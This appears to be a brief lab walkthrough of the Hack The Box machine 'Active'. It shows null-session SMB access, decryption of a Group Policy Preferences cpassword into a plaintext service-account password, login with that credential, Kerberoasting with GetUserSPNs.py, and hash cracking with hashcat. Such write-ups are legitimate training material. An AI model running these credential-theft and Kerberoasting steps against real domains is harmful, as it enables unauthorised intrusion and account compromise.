The smb share allows Null authentication to the Replication share
```shell
smbclient \\\\10.10.10.100\\Replication -N

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 


```
The **cpassword** in the Groups.xml is an encrypted password that was used by Group Policy Preferences prior to Microsoft patching this known issue (MS14-025)
#### Cpassword value:
```
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

# Decrypting the Password
```shell
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18

```
# Connecting to the Users share
```shell
smbclient \\\\10.10.10.100\\Users -U 'SVC_TGS%GPPstillStandingStrong2k18'

Try "help" to get a list of possible commands.
smb: \> dir


```

# Kerberoasting 
```shell
GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request

```
Crack the hash
```shell
hashcat -m 13100 admin_hash.txt /usr/share/wordlists/rockyou.txt 
```